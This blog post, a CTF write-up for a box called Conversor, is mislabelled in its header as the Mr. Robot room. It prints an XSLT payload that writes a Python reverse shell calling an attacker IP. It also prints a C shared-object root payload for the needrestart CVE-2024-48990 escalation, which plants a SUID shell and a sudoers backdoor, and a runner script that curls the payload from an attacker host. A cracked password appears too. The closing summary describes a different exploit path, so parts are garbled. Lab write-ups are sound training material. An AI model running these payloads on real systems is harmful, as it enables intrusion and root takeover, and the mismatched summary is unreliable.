---
layout: post
title: CONVERSOR - coming soon
date:   2025-11-05 11:05
description: TryHackMe Mr. Robot CTF Write-Up
tags: tryhackme wordpress 
comments: false
---
# CONVERSOR
-TRYHACKME CTF WRITEUP-
[Link To CTF](https://tryhackme.com/room/mrrobot)


CONVERSOR



nmap show port 22 and 80 open

******************************nmap

Doing a deeper scan and navigating to the page
We can see this IP must be added into our hosts file to resolve the DNS

sudo nano /etc/hosts
<IP_ address> conversor.htb

******************************hosts file


After navigating to conversor.htb we get redirected to /login


Looking for hidden directories nothing really stands out

****************************** gobuster

Lets register a fake user and have a look around the website

****************************** fake user

After signing up, we were taken to the covertsor page, which said to upload an XML file and an XSLT sheet to convert it into a prettier format.


The /about page shows that we can download the source code

****************************** source code

unzip and lok at the source code


Looking at app.py This shows us the location of the users database:



****************************** app.py1

We can also see the app.secre.key

This looks like an app/api key that will be useful later

app.secret_key = 'Changemeplease'



****************************** app.py


install.md shows:



****************************** install.md


So we can write ptyhon file into **/var/www/conversor.htb/scripts/** and wait cron job to execute it.

Lets go back to the /convert page
We will need to upload any .xml file and as well as upload our .xslt shell code


On our attacker machine we will create 2 files
Don't forget to modify file 2



1.    xml.xml

<?xml version="1.0" encoding="UTF-8"?>
<catalog>
 <cd>
 <title>CD Title</title>
 <artist>The artist</artist>
 <company>Da Company</company>
 <price>10000</price>
 <year>1760</year>
 </cd>
</catalog>




2.    write.xslt

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
 <xsl:template match="/">
 <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>



We will now start our netcat listener and wait 60 seconds for the reverse shell

$ rlwrap nc -lvnp <listen_port>

-we add rlwrap to give history/arrow capabilities to the shell

****************************** rev shell


Once we get the shell we can run:

$ python3 -c 'import pty; pty.spawn(/bin/bash")'

this will stabilize the shell


But we are only the www-data user with limited privileges

moving into /var/www/conversor/instance/
We can see the users databse file

Looking at this we get fismathack username and password hash

******************************users.db

fismathack5b5c3ac3a1c897c94caad48e6c71fdec

We can easily crack this with an online cracker to get fismathack password


******************************hack cracked

 Found:

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm


We can now switch users to fismathack



******************************switch users


we can now navigate to /home/fismathack and read the user flag !!!!!



****************************** users.txt




____________________________________________________________

# priv esc


running sudo -l shows us
we can run 'needrestart' as root

****************************** sudo -l 

Doing a google search we can see CVE-2024-48990

https://www.wiz.io/vulnerability-database/cve/cve-2024-48990
The vulnerability occurs when needrestart processes Python interpreter instances. When determining whether a Python process needs to be restarted, needrestart extracts the PYTHONPATH environment variable from the process's /proc/pid/environ and sets this environment variable before executing Python. If a Python process belongs to a local attacker, needrestart executes Python with the attacker-controlled PYTHONPATH environment variable, enabling arbitrary code execution as root. The vulnerability has been assigned a CVSS v3.1 Base Score of 7.8 HIGH with vector CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (NVD).

Let's look for any exploits



https://github.com/ten-ops/CVE-2024-48990_needrestart

I found this 

****************************** github
CVE-2024-48990
didn't use exploit 


-----------------------------

Payload 1: lib.c (The Root Payload)

This is the C code for our malicious __init__.so file. We create this on our attacker machine.

/* lib.c - Our malicious shared object */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/* This is a GCC attribute that marks 'a()' as a constructor. */
/* This function will run AUTOMATICALLY when the library is loaded. */
static void a() __attribute__((constructor));

void a() {
    /* Only run if we are root */
    if(geteuid() == 0) { 
        setuid(0);
        setgid(0);
        
        /* The payload:
           1. Copy the bash shell to /tmp/poc
           2. Make /tmp/poc a SUID binary (owned by root, runs as root)
           3. Add a sudoers rule as a backup persistence method
        */
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers";
        system(shell);
    }
}


-----------------------------


Payload 2: Compiling the Payload

The target is x86_64 Linux. We need to compile lib.c as a 64-bit shared object (.so) file.

# On our Attacker Machine
# The PDF notes a cross-compiler, but if you're on 64-bit Kali/Parrot:
gcc -shared -fPIC -o __init__.so lib.c
-----------------------------

Payload 3: runner.sh (The Trigger Script)

This is the script we will run on the victim (Conversor) as the f****** user. It sets up the whole hijack.

#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

#chage to your ip and open python http server
curl http://10.10.14.118:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null

-----------------------------

This payload will download __init__.so to the victim machine


After executing runner.sh, we need to open another ssh window and execute sudo /usr/sbin/needrestart to obtain the root shell.






The exploitation of Conversor follows a logical, two-stage path. The first stage focuses on gaining initial access through the web application. This is achieved by exploiting the command injection vulnerability in the currency converter API. You craft a payload that creates a reverse shell and inject it into the vulnerable URL parameter. This gives you a low-privilege shell as the www-data user.

The second stage is privilege escalation. After getting on the system, your enumeration reveals a script that can be run as root. This script uses a binary like zip without a full path. You exploit this by creating your own malicious zip file (containing a reverse shell payload), placing it in a directory you control, and modifying the PATH variable.
